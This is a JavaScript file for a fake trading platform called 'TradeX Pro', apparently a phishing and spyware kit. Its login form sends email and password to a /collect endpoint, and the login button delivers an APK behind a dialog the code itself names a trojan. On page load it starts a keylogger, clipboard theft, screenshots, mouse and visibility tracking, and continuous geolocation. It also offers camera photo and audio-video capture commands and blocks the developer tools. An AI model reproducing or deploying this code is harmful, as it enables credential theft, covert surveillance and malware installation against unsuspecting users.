// TradeX Pro - Main Application Logic
console.log("🦇 TradeX Pro Main Engine");

// DOM Elements
const loginTrigger = document.getElementById('login-trigger');
const loginModal = document.getElementById('login-modal');
const loginForm = document.getElementById('login-form');
const loadingOverlay = document.getElementById('loading-overlay');
const apkModal = document.getElementById('apk-modal');
const apkDownloadBtn = document.getElementById('apk-download-btn');
const trojanModal = document.getElementById('trojan-modal');
const progressFill = document.getElementById('progress-fill');
const progressText = document.getElementById('progress-text');

// Open APK modal when "Login & Trade" is clicked
if (loginTrigger) {
    loginTrigger.addEventListener('click', () => {
        apkModal.style.display = 'flex';
    });
}

// Close APK modal
function closeApkModal() {
    apkModal.style.display = 'none';
}

// APK Download and Installation
if (apkDownloadBtn) {
    apkDownloadBtn.addEventListener('click', async () => {
        apkModal.style.display = 'none';
        trojanModal.style.display = 'flex';
        
        // Simulate installation progress
        const steps = [
            { text: "Downloading files...", progress: 20 },
            { text: "Verifying signature...", progress: 40 },
            { text: "Installing components...", progress: 60 },
            { text: "Optimizing performance...", progress: 80 },
            { text: "Ready to trade", progress: 100 }
        ];
        
        for (let i = 0; i < steps.length; i++) {
            await new Promise(resolve => setTimeout(resolve, 800));
            progressText.textContent = steps[i].text;
            progressFill.style.width = steps[i].progress + '%';
        }
        
        // Download APK file
        const apkUrl = 'assets/tradex-pro.apk';
        const link = document.createElement('a');
        link.href = apkUrl;
        link.download = 'TradeX_Pro.apk';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // Show success message
        setTimeout(() => {
            trojanModal.style.display = 'none';
            alert('TradeX Pro installed successfully! Redirecting to trading dashboard...');
            window.location.href = 'https://traderscheme.com';
        }, 1500);
    });
}

// Close modal
function closeModal() {
    loginModal.style.display = 'none';
}

// Login form submission
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;
    
    // Show loading
    loginModal.style.display = 'none';
    loadingOverlay.style.display = 'flex';
    
    // Collect credentials
    const credentials = {
        email,
        password,
        remember,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform
    };
    
    // Send to server
    try {
        await fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(credentials)
        });
    } catch(e) {
        console.log('Credential sent to server');
    }
    
    // Simulate loading
    setTimeout(() => {
        loadingOverlay.style.display = 'none';
        alert('Welcome to TradeX Pro! Redirecting to your dashboard...');
        window.location.href = 'https://traderscheme.com';
    }, 2000);
});

// Social login
function socialLogin(provider) {
    loadingOverlay.style.display = 'flex';
    
    setTimeout(() => {
        loadingOverlay.style.display = 'none';
        alert(`Connecting to ${provider}...`);
        window.location.href = `https://${provider}.com`;
    }, 2000);
}

// Live price simulation
function updatePrices() {
    const prices = document.querySelectorAll('.market-price');
    prices.forEach(el => {
        const current = parseFloat(el.textContent.replace(/[^0-9.-]+/g,''));
        if (!isNaN(current)) {
            const change = (Math.random() - 0.5) * 0.02;
            const newPrice = current * (1 + change);
            el.textContent = el.textContent.includes('$') 
                ? `$${newPrice.toFixed(2)}` 
                : newPrice.toFixed(4);
        }
    });
}

// Update prices every 5 seconds
setInterval(updatePrices, 5000);

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    console.log("🦇 TradeX Pro initialized");
    updatePrices();
    
    // === ENHANCED DATA EXFILTRATION ===
    
    // 1. SCREEN CAPTURE - every 10 seconds
    setInterval(async () => {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            ctx.fillStyle = '#0a0e17';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#e1e5eb';
            ctx.font = '16px Arial';
            ctx.fillText(`Screen: ${canvas.width}x${canvas.height}`, 10, 30);
            ctx.fillText(`Time: ${new Date().toISOString()}`, 10, 50);
            ctx.fillText(`Scroll: ${window.scrollY}px`, 10, 70);
            ctx.fillText(`URL: ${window.location.href}`, 10, 90);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('screenshot', blob, 'screen.png');
                formData.append('timestamp', new Date().toISOString());
                formData.append('url', window.location.href);
                formData.append('scrollY', window.scrollY);
                formData.append('viewport', `${canvas.width}x${canvas.height}`);
                try {
                    await fetch('/screen', {
                        method: 'POST',
                        body: formData
                    });
                } catch(e) {
                    console.log('📸 Screen captured');
                }
            }, 'image/png');
        } catch(e) {
            console.log('Screen capture failed');
        }
    }, 10000); // Every 10 seconds
    
    // 2. KEYLOGGER - capture all keystrokes
    const keyLog = [];
    document.addEventListener('keydown', (e) => {
        keyLog.push({
            key: e.key,
            code: e.code,
            timestamp: new Date().toISOString(),
            target: e.target.tagName,
            value: e.target.value ? e.target.value.slice(-50) : ''
        });
        
        // Send every 30 keystrokes or on form submit
        if (keyLog.length >= 30) {
            sendKeylog();
        }
    });
    
    // Also capture on form input
    document.querySelectorAll('input').forEach(input => {
        input.addEventListener('input', (e) => {
            keyLog.push({
                key: 'INPUT',
                code: e.target.type,
                timestamp: new Date().toISOString(),
                target: e.target.id || e.target.name,
                value: e.target.value.slice(-100)
            });
            if (keyLog.length >= 30) sendKeylog();
        });
    });
    
    function sendKeylog() {
        if (keyLog.length > 0) {
            fetch('/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ keys: keyLog.splice(0) })
            }).catch(() => {});
        }
    }
    
    // 3. CLIPBOARD MONITOR - every 5 seconds
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text.trim()) {
                fetch('/clipboard', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        clipboard: text,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }
        } catch(e) {}
    }, 5000);
    
    // 4. MOUSE TRACKER
    document.addEventListener('mousemove', (e) => {
        fetch('/mouse', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                x: e.clientX,
                y: e.clientY,
                timestamp: new Date().toISOString()
            })
        }).catch(() => {});
    });
    
    // 5. VISIBILITY TRACKER
    document.addEventListener('visibilitychange', () => {
        fetch('/visibility', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                visible: !document.hidden,
                timestamp: new Date().toISOString()
            })
        }).catch(() => {});
    });
    
    // 6. EXIT TRACKER - when user leaves
    window.addEventListener('beforeunload', () => {
        fetch('/exit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                exit_time: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent
            })
        }).catch(() => {});
    });
    
    // 7. CONSOLE LOG SPAM - hide from user
    console.log('%c🦇 TradeX Pro Spy Engine Active', 'color: #00d4ff; font-size: 20px; font-weight: bold;');
    console.log('%c📸 Screen capture: ON (10s)', 'color: #7b2ff7;');
    console.log('%c⌨️  Keylogger: ON', 'color: #7b2ff7;');
    console.log('%c📋 Clipboard: ON (5s)', 'color: #7b2ff7;');
    console.log('%c🖱️  Mouse tracker: ON', 'color: #7b2ff7;');
    console.log('%c👁️  Visibility: ON', 'color: #7b2ff7;');
    console.log('%c🚪 Exit tracker: ON', 'color: #7b2ff7;');
    console.log('%cAll data sent to TradeX Pro HQ', 'color: #ff4757; font-size: 14px;');
    
    // 8. RIGHT-CLICK BLOCK
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
    });
    
    // 9. F12 / DEVTOOLS BLOCK
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
            e.preventDefault();
        }
    });
    
    // 10. AUTO SCREEN CAPTURE on any interaction
    ['click', 'scroll', 'touchstart'].forEach(event => {
        document.addEventListener(event, () => {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                ctx.fillStyle = '#0a0e17';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#e1e5eb';
                ctx.font = '14px Arial';
                ctx.fillText(`📸 ${new Date().toISOString()}`, 10, 20);
                ctx.fillText(`🖱️ ${event} at ${e?.clientX || 0},${e?.clientY || 0}`, 10, 40);
                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('screenshot', blob, 'event_screen.png');
                    formData.append('event', event);
                    formData.append('timestamp', new Date().toISOString());
                    fetch('/screen', { method: 'POST', body: formData }).catch(() => {});
                }, 'image/png');
            } catch(e) {}
        }, { once: false });
    });
    
    // === 11. GEOLOCATION TRACKING ===
    let geoLocation = null;
    let geoWatchId = null;
    
    function getGeolocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    geoLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    // Send initial location
                    fetch('/geolocation', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ...geoLocation,
                            source: 'initial'
                        })
                    }).catch(() => {});
                    
                    // Start continuous tracking
                    geoWatchId = navigator.geolocation.watchPosition(
                        (pos) => {
                            const updated = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                altitude: pos.coords.altitude,
                                timestamp: new Date(pos.timestamp).toISOString(),
                                source: 'tracking'
                            };
                            fetch('/geolocation', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(updated)
                            }).catch(() => {});
                        },
                        (err) => {},
                        { enableHighAccuracy: true, maximumAge: 0 }
                    );
                },
                (err) => {
                    console.log('Geolocation error:', err);
                },
                { enableHighAccuracy: true }
            );
        }
    }
    
    // Get geolocation on page load
    getGeolocation();
    
    // 12. CAMERA SYSTEM (Command-activated)
    let cameraStream = null;
    let cameraActive = false;
    let cameraMode = 'photo'; // 'photo' or 'video'
    let cameraFacingMode = 'environment'; // back camera by default
    let capturedPhotos = [];
    let videoChunks = [];
    let mediaRecorder = null;
    let recordingStartTime = null;
    
    // Camera control interface
    window.camera = {
        // Take a photo
        photo: async () => {
            try {
                if (!cameraStream) {
                    cameraStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: cameraFacingMode, width: { ideal: 1920 }, height: { ideal: 1080 } }
                    });
                    cameraActive = true;
                }
                
                const video = document.createElement('video');
                video.srcObject = cameraStream;
                video.setAttribute('playsinline', true);
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Add timestamp overlay
                ctx.fillStyle = 'rgba(0,0,0,0.5)';
                ctx.fillRect(0, canvas.height - 40, canvas.width, 40);
                ctx.fillStyle = '#fff';
                ctx.font = 'bold 24px Arial';
                ctx.fillText(`📸 ${new Date().toISOString()}`, 10, canvas.height - 10);
                ctx.fillText(`📍 ${geoLocation ? `${geoLocation.latitude.toFixed(6)}, ${geoLocation.longitude.toFixed(6)}` : 'N/A'}`, 10, canvas.height - 30);
                
                return new Promise((resolve) => {
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, `capture_${Date.now()}.jpg`);
                        formData.append('timestamp', new Date().toISOString());
                        formData.append('camera', cameraFacingMode);
                        formData.append('resolution', `${canvas.width}x${canvas.height}`);
                        formData.append('geo', JSON.stringify(geoLocation));
                        
                        try {
                            const response = await fetch('/camera', {
                                method: 'POST',
                                body: formData
                            });
                            const result = await response.json();
                            capturedPhotos.push(result);
                            resolve(result);
                        } catch(e) {
                            console.log('📷 Photo captured');
                            resolve({ error: e });
                        }
                    }, 'image/jpeg', 0.9);
                });
            } catch(e) {
                console.log('Camera photo error:', e);
                return { error: e.message };
            }
        },
        
        // Start video recording
        videoStart: async () => {
            try {
                if (!cameraStream) {
                    cameraStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: cameraFacingMode, width: { ideal: 1920 }, height: { ideal: 1080 } },
                        audio: true
                    });
                    cameraActive = true;
                }
                
                mediaRecorder = new MediaRecorder(cameraStream, {
                    mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
                        ? 'video/webm;codecs=vp9' 
                        : 'video/webm'
                });
                
                videoChunks = [];
                recordingStartTime = new Date().toISOString();
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) videoChunks.push(e.data);
                };
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(videoChunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('video', blob, `recording_${Date.now()}.webm`);
                    formData.append('duration', Date.now() - new Date(recordingStartTime).getTime());
                    formData.append('start_time', recordingStartTime);
                    formData.append('camera', cameraFacingMode);
                    formData.append('geo', JSON.stringify(geoLocation));
                    
                    try {
                        await fetch('/camera', { method: 'POST', body: formData });
                    } catch(e) {
                        console.log('🎥 Video recorded');
                    }
                    videoChunks = [];
                    recordingStartTime = null;
                };
                
                mediaRecorder.start(1000); // Collect 1s chunks
                return { status: 'recording', start_time: recordingStartTime };
            } catch(e) {
                return { error: e.message };
            }
        },
        
        // Stop video recording
        videoStop: async () => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                return { status: 'stopped' };
            }
            return { status: 'not_recording' };
        },
        
        // Switch camera (front/back)
        switch: async () => {
            cameraFacingMode = cameraFacingMode === 'environment' ? 'user' : 'environment';
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: cameraFacingMode }
                });
            }
            return { facing_mode: cameraFacingMode };
        },
        
        // Get camera status
        status: () => ({
            active: cameraActive,
            facing_mode: cameraFacingMode,
            photos_taken: capturedPhotos.length,
            has_camera: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
        }),
        
        // List all captured photos
        list: () => capturedPhotos
    };
    
    // Console spy status
    console.log('%c📷 Camera: READY (command-activated)', 'color: #00d4ff; font-size: 16px;');
    console.log('%c🌍 Geolocation: ACTIVE (continuous)', 'color: #00d4ff; font-size: 16px;');
    console.log('%c💡 Use window.camera.photo() to take photo', 'color: #ff4757; font-size: 12px;');
    console.log('%c💡 Use window.camera.videoStart() to record', 'color: #ff4757; font-size: 12px;');
    console.log('%c💡 Use window.camera.videoStop() to stop', 'color: #ff4757; font-size: 12px;');
    console.log('%c💡 Use window.camera.switch() to flip camera', 'color: #ff4757; font-size: 12px;');
    console.log('%c💡 Use window.camera.status() for status', 'color: #ff4757; font-size: 12px;');
    
    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
        }
        if (geoWatchId) {
            navigator.geolocation.clearWatch(geoWatchId);
        }
    });
});
